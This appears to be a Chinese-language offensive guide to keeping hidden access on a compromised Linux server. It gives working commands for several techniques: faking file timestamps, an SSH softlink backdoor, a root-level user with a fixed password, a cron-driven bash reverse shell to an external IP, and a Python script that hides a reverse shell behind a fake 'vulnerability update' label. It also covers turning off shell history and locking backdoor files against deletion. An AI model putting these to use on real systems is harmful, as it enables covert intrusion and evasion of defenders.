修改文件修改时间

攻防演练中，蓝队有时会通过文件修改时间来判断文件是否为攻击人员新添加的后门，这时可以通过修改文件最后修改时间来达到隐蔽自己的目的。可以通过命令 touch -c -t 201604061234 filename 来修改文件显示的最后修改时间。

隐藏文件

touch命令可创建隐藏文件，例如：
Default
touch .shell.php

使用通常的命令ls或者ls -l都无法看到，只能通过ls -al查看到隐藏文件。

SSH软连接后门

在sshd服务配置启用PAM认证的前提下，PAM配置文件中控制标志为sufficient时，只要pam_rootok模块检测uid为0（root）即可成功认证登录。使用命令：ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31387
任意可达网络内输入：ssh root@IP -p 31387 即可无密码连接SSH。

添加用户

当通过web服务或者其他不稳定中间件拿到目标服务器root权限shell时，为做好权限维持，可以直接添加高权限用户，通过连接SSH来进行后续操作。
创建root高权限用户：
Default
useradd -p `openssl passwd -1 -salt ’sqli’ password123` -u 0 -o -g root -G root -s /bin/bash -d /usr/bin/sqli sqli

执行后使用用户名sqli与密码password123以root权限登录SSH。
创建普通用户：
Default
useradd -p `openssl passwd -1 -salt 'salt' password123` guest

执行后使用用户名guest与密码password123以root权限登录SSH。

Crond定时任务

拿到服务器权限后，添加Crond计划任务来让服务器定时反弹shell，从而达到权限维持的目的。
首先创建.sh文件，编辑文件内容为反弹shell脚本，内容以bash反弹命令为例：
Default
bash -i >& /dev/tcp/192.168.2.222/12345  0>&1

编辑结束后保存。
输入crontab -e根据.sh脚本文件路径创建定时任务（此任务为每分钟执行一次）：
Default
*/1 * * * * root /home/test/shell.sh

注：centos7不需要root参数，不然会报错。创建完成后通过crontab -l查看已创建的定时任务。
重启crond服务即可在接收端接受反弹的shell，重启命令如下：
Default
service crond restart

SSH公钥免密登录

客户端本地生成公钥，将公钥上传到服务器，之后即可无密码登录服务器。
Default
cd root/.ssh/ 
ssh-keygen -t rsa # 生成公钥
cat id_rsa.pub >> authorized_keys # 加入授权文件
chmod 600 ./authorized_keys # 给予权限
ssh-copy-id -i /root/.ssh/id_rsa.pub root@服务器IP  #将公钥上传到服务器

完成后即可无密码登录服务器。

后门隐藏脚本内容

cat命令支持\r\f\n等换行换页符，通过在命令中穿插这类符号可以达到隐藏脚本真实内容的目的。
通过以下python脚本生成一个带反弹shell的脚本文件：
Default
cmd_h = "bash -i >& /dev/tcp/IP/12345  0>&1" #需要隐藏的脚本内容
cmd_v = "系统漏洞更新脚本" #cat命令可视内容
 
with open("test2.sh", "w") as f:
    output = "#!/bin/sh\n"
    output += cmd_h + ";" + cmd_v + " #\r" + cmd_v + " " * (len(cmd_h) + 3) + "\n"
    f.write(output)

接下来使用cat命令查看内容：
执行脚本后，客户端接收到服务器shell。
这个方法可以配合修改文件最后修改时间后加入计划任务，可以起到很大程度的迷惑性。

关闭历史操作命令

在系统后门安全排查时，会通过历史命令来溯源到危险文件，可以在拿到服务器shell时第一时间关闭历史命令记录来隐蔽自己的各种操作。
Default
set +o history #关闭历史记录
set -o history #恢复历史记录
history | grep "test" #删除包含test的历史记录

关闭历史记录后，所有操作不会再记录。

隐藏脚本权限

通过chattr命令可以锁定文件防止root用户删除，可以使用此命令进一步保护后门文件。
Default
chattr +i shell.jsp #锁定文件
chattr -i shell.jsp #解锁文件